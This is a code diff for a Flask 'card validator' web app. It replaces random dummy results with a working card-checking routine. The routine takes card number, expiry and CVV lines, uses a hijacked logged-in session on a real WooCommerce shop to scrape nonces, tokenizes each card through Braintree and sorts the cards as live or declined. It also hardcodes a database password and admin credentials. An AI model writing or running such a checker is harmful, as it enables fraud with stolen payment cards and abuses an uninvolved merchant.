@@ -4,13 +4,10 @@ from datetime import datetime, timedelta
 import os
 import re
 import random
-import json
-import re
-import random
-import time
+import base64
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
-
+import json
 # MongoDB setup
 client = MongoClient('mongodb://ahmed:Ma_213243@cluster0-shard-00-00.sdxls.mongodb.net:27017,cluster0-shard-00-01.sdxls.mongodb.net:27017,cluster0-shard-00-02.sdxls.mongodb.net:27017/?ssl=true&replicaSet=atlas-qmfg4n-shard-0&authSource=admin&retryWrites=true&w=majority&appName=Cluster0')
 db = client['card_validator']
@@ -20,7 +17,10 @@ settings_col = db['settings']
 admin_collection = db["admin"]
 if not admin_collection.find_one({"_id": "admin"}):
     admin_collection.insert_one({"_id": "admin", "username": "saoud", "password": "saoud12"})
-
+import json
+import re
+import random
+import time
 # إنشاء الإعدادات الافتراضية إن لم تكن موجودة
 if not settings_col.find_one({'name': 'main'}):
     settings_col.insert_one({
@@ -41,22 +41,239 @@ def validate_card_format(card):
     pattern = r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$'
     return bool(re.match(pattern, card.strip()))
 
-def dummy_check_card(card, validator_type=1):
-    """
-    دالة وهمية لتوزيع النتائج بشكل عشوائي.
-    في مشروعك الحقيقي، يمكنك الاتصال بـ API خارجي أو استخدام أي منطق تريده.
-    """
-    # للتمييز بين الفاليديتور الأول والثاني
-    # validator_type=1 -> (Approved, CCN, Declined)
-    # validator_type=2 -> (Charged, Approved, CCN, Declined)
-    results_pool = []
-    if validator_type == 1:
-        # ثلاثة احتمالات
-        results_pool = ["approved", "ccn", "declined"]
-    else:
-        # أربعة احتمالات
-        results_pool = ["charged", "approved", "ccn", "declined"]
-    return random.choice(results_pool)
+def Tele(card):
+		from user_agent import generate_user_agent
+		import user_agent
+		import requests
+		import re
+		import random
+		card = card.strip()
+		parts = re.split(r'[ |/]', card)
+		c = parts[0]
+		mm = parts[1]
+		ex = parts[2]
+		cvc = parts[3]
+		try:
+		    yy = ex[2] + ex[3]
+		    if '2' in ex[3] or '1' in ex[3]:
+		        yy = ex[2] + '7'
+		    else:
+		        pass
+		except:
+		    yy = ex[0] + ex[1]
+		    if '2' in ex[1] or '1' in ex[1]:
+		        yy = ex[0] + '7'
+		    else:
+		        pass
+		r=requests.session()
+		user = user_agent.generate_user_agent()
+	
+		user = user_agent.generate_user_agent()
+		session = requests.Session()
+	
+		r = requests.session()
+		
+		import requests
+	
+		cookies = {  'wordpress_logged_in_5789f511013b45655a4edab7a13cc1e2': 'omaouw%7C1741542643%7CObEcPd7IDLNvz4Cl5mpHsZEBV4AITduAyq8Eam9h5uM%7C8ec369a1a6101c72fe5f1e971c4dd2db3ec04d6185087bf0a55fac06b74546a0',
+	}
+	
+		headers = {
+	    'authority': 'andersonminnows.com',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+	    'cache-control': 'max-age=0',
+	    # 'cookie': 'wordpress_logged_in_5789f511013b45655a4edab7a13cc1e2=omaouw%7C1741542643%7CObEcPd7IDLNvz4Cl5mpHsZEBV4AITduAyq8Eam9h5uM%7C8ec369a1a6101c72fe5f1e971c4dd2db3ec04d6185087bf0a55fac06b74546a0; wfwaf-authcookie-88fd0e871f81d265ab1c13bd4c425edf=215333%7Cother%7Cread%7Cb9caa86515e07965d3e7e89896198dec2480894275d320a8f01227be38cf2e6c; _ga=GA1.1.1302922668.1740051392; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-02-23%2017%3A49%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fandersonminnows.com%2Fshop%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-02-23%2017%3A49%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fandersonminnows.com%2Fshop%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; _ga_5LJDWM9SVR=GS1.1.1740332985.3.1.1740333045.0.0.0; PHPSESSID=e128586a1b23430ef957eecc6fa47275; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fandersonminnows.com%2Fshop%2Faccount%2Fadd-payment-method%2F',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'document',
+	    'sec-fetch-mode': 'navigate',
+	    'sec-fetch-site': 'none',
+	    'sec-fetch-user': '?1',
+	    'upgrade-insecure-requests': '1',
+	    'user-agent': user,
+	}
+	
+		response = r.get('https://andersonminnows.com/shop/account/add-payment-method/', cookies=cookies, headers=headers)
+		
+		s = re.search(r'credit_card","client_token_nonce":"(.*?)"', response.text).group(1)
+		
+		k = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
+		
+		import requests
+	
+		cookies = { 'wordpress_logged_in_5789f511013b45655a4edab7a13cc1e2': 'omaouw%7C1741542643%7CObEcPd7IDLNvz4Cl5mpHsZEBV4AITduAyq8Eam9h5uM%7C8ec369a1a6101c72fe5f1e971c4dd2db3ec04d6185087bf0a55fac06b74546a0',
+	}
+	
+		headers = {
+	    'authority': 'andersonminnows.com',
+	    'accept': '*/*',
+	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    # 'cookie': 'wordpress_sec_5789f511013b45655a4edab7a13cc1e2=omaouw%7C1741542643%7CObEcPd7IDLNvz4Cl5mpHsZEBV4AITduAyq8Eam9h5uM%7C129a539324e7c4542dbaf3970f5471c1af5660f1013490706341f7aa89859e18; wordpress_logged_in_5789f511013b45655a4edab7a13cc1e2=omaouw%7C1741542643%7CObEcPd7IDLNvz4Cl5mpHsZEBV4AITduAyq8Eam9h5uM%7C8ec369a1a6101c72fe5f1e971c4dd2db3ec04d6185087bf0a55fac06b74546a0; wfwaf-authcookie-88fd0e871f81d265ab1c13bd4c425edf=215333%7Cother%7Cread%7Cb9caa86515e07965d3e7e89896198dec2480894275d320a8f01227be38cf2e6c; _ga=GA1.1.1302922668.1740051392; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-02-23%2017%3A49%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fandersonminnows.com%2Fshop%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-02-23%2017%3A49%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fandersonminnows.com%2Fshop%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; _ga_5LJDWM9SVR=GS1.1.1740332985.3.1.1740333045.0.0.0; PHPSESSID=e128586a1b23430ef957eecc6fa47275; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fandersonminnows.com%2Fshop%2Faccount%2Fadd-payment-method%2F',
+	    'origin': 'https://andersonminnows.com',
+	    'referer': 'https://andersonminnows.com/shop/account/add-payment-method/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': user,
+	    'x-requested-with': 'XMLHttpRequest',
+	}
+	
+		data = {
+	    'action': 'wc_braintree_credit_card_get_client_token',
+	    'nonce': s,
+	}
+	
+		response = r.post('https://andersonminnows.com/shop/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+		
+		enc = (response.json()['data'])
+	
+		dec = base64.b64decode(enc).decode('utf-8')
+	
+		au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
+	
+	
+		import requests
+	
+		headers = {
+	    'authority': 'payments.braintree-api.com',
+	    'accept': '*/*',
+	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+	    'authorization': f'Bearer {au}',
+	    'braintree-version': '2018-05-10',
+	    'content-type': 'application/json',
+	    'origin': 'https://assets.braintreegateway.com',
+	    'referer': 'https://assets.braintreegateway.com/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'cross-site',
+	    'user-agent': user,
+	}
+	
+		json_data = {
+	    'clientSdkMetadata': {
+	        'source': 'client',
+	        'integration': 'custom',
+	        'sessionId': 'a0668810-6de4-433e-a06c-a3a994b78fed',
+	    },
+	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+	    'variables': {
+	        'input': {
+	            'creditCard': {
+	                'number': c,
+	                'expirationMonth': mm,
+	                'expirationYear': ex,
+	                'cvv': cvc,
+	            },
+	            'options': {
+	                'validate': False,
+	            },
+	        },
+	    },
+	    'operationName': 'TokenizeCreditCard',
+	}
+	
+		response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+	
+	
+		tok = response.json()['data']['tokenizeCreditCard']['token']
+		
+		import requests
+	
+		cookies = {  'wordpress_logged_in_5789f511013b45655a4edab7a13cc1e2': 'omaouw%7C1741542643%7CObEcPd7IDLNvz4Cl5mpHsZEBV4AITduAyq8Eam9h5uM%7C8ec369a1a6101c72fe5f1e971c4dd2db3ec04d6185087bf0a55fac06b74546a0',
+	}
+	
+		headers = {
+	    'authority': 'andersonminnows.com',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+	    'cache-control': 'max-age=0',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    # 'cookie': 'wordpress_logged_in_5789f511013b45655a4edab7a13cc1e2=omaouw%7C1741542643%7CObEcPd7IDLNvz4Cl5mpHsZEBV4AITduAyq8Eam9h5uM%7C8ec369a1a6101c72fe5f1e971c4dd2db3ec04d6185087bf0a55fac06b74546a0; wfwaf-authcookie-88fd0e871f81d265ab1c13bd4c425edf=215333%7Cother%7Cread%7Cb9caa86515e07965d3e7e89896198dec2480894275d320a8f01227be38cf2e6c; _ga=GA1.1.1302922668.1740051392; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-02-23%2017%3A49%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fandersonminnows.com%2Fshop%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-02-23%2017%3A49%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fandersonminnows.com%2Fshop%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; _ga_5LJDWM9SVR=GS1.1.1740332985.3.1.1740333045.0.0.0; PHPSESSID=e128586a1b23430ef957eecc6fa47275; sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fandersonminnows.com%2Fshop%2Faccount%2Fadd-payment-method%2F',
+	    'origin': 'https://andersonminnows.com',
+	    'referer': 'https://andersonminnows.com/shop/account/add-payment-method/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'document',
+	    'sec-fetch-mode': 'navigate',
+	    'sec-fetch-site': 'same-origin',
+	    'sec-fetch-user': '?1',
+	    'upgrade-insecure-requests': '1',
+	    'user-agent': user,
+	}
+	
+		data = [
+	    ('payment_method', 'braintree_credit_card'),
+	    ('wc-braintree-credit-card-card-type', 'master-card'),
+	    ('wc-braintree-credit-card-3d-secure-enabled', ''),
+	    ('wc-braintree-credit-card-3d-secure-verified', ''),
+	    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
+	    ('wc_braintree_credit_card_payment_nonce', tok),
+	    ('wc_braintree_device_data', '{"correlation_id":"849ef371bebf05f665700471a3107316"}'),
+	    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
+	    ('wc_braintree_paypal_payment_nonce', ''),
+	    ('wc_braintree_device_data', '{"correlation_id":"849ef371bebf05f665700471a3107316"}'),
+	    ('wc-braintree-paypal-context', 'shortcode'),
+	    ('wc_braintree_paypal_amount', '0.00'),
+	    ('wc_braintree_paypal_currency', 'USD'),
+	    ('wc_braintree_paypal_locale', 'en_us'),
+	    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
+	    ('woocommerce-add-payment-method-nonce', k),
+	    ('_wp_http_referer', '/shop/account/add-payment-method/'),
+	    ('woocommerce_add_payment_method', '1'),
+	]
+	
+		response = r.post(
+	    'https://andersonminnows.com/shop/account/add-payment-method/',
+	    cookies=cookies,
+	    headers=headers,
+	    data=data,
+	)
+	
+	
+		text = response.text
+		msg = response.text
+		pattern = r'<ul class="woocommerce-error" role="alert">\s*<li>\s*Status code\s*([^<]+)\s*</li>'
+		match = re.search(pattern, text)
+		if match:
+			result = match.group(1)
+			print(result)
+			if 'risk_threshold' in text:
+				result = "declined"
+		else:
+			if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
+				result = "approved"
+			
+			else:
+				
+				result = "declined"
+				
+	
+		if 'added' in result or 'approved' in result or \
+	    'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or \
+	    'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or \
+	    'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or \
+	    'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
+			return 'approved'
+		elif 'avs' in result:
+			return 'approved'
+		elif 'Card Issuer Declined CVV' in result:
+			return 'ccn'
+		else:
+			print(result)
+			return 'declined'
+			
+		
+    
 
 def has_valid_code_for_ip(ip):
     """
@@ -86,29 +303,8 @@ def home():
     return render_template_string(HOME_TEMPLATE,
                                   validator1_active=validator1_active,
                                   validator2_active=validator2_active)
-def validate_card_format(card):
-    """التحقق من تنسيق البطاقة"""
-    pattern = r'^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$'
-    return re.match(pattern, card) is not None
 
-def dummy_check_card(card, validator_type=2):
-    """محاكاة عملية فحص البطاقة (للاختبار)"""
-    time.sleep(0.5)  # محاكاة زمن الانتظار
-    
-    # نماذج نتائج عشوائية
-    rand_num = random.randint(1, 100)
-    
-    if validator_type == 1:
-        return 'charged' if rand_num > 50 else 'declined'
-    else:
-        if rand_num > 80:
-            return 'approved'
-        elif rand_num > 60:
-            return 'ccn'
-        else:
-            return 'declined'
 
-# حالة التحكم في الفحص (يجب وضعها في أعلى الملف)
 validation_active = False
 stop_requested = False
 
@@ -143,9 +339,10 @@ def validator1():
             if not validate_card_format(card):
                 continue
                 
-            result = dummy_check_card(card)
-            results[result].append(card)
+            result = Tele(card)
             
+            results[result].append(card)
+           
             yield "data: {}\n\n".format(json.dumps({
                 'type': 'update',
                 'category': result,
@@ -517,7 +714,7 @@ def validator2():
                 break
             if not validate_card_format(card):
                 continue
-            result = dummy_check_card(card, validator_type=2)
+            result = Tele2()
             results[result].append(card)
             yield "data: {}\n\n".format(json.dumps({
                 'type': 'update',
@@ -1365,5 +1562,6 @@ def change_admin():
     new_password = request.form["password"]
     admin_collection.update_one({"_id": "admin"}, {"$set": {"username": new_username, "password": new_password}})
     return redirect(url_for("admin_dashboard"))
+
 
 
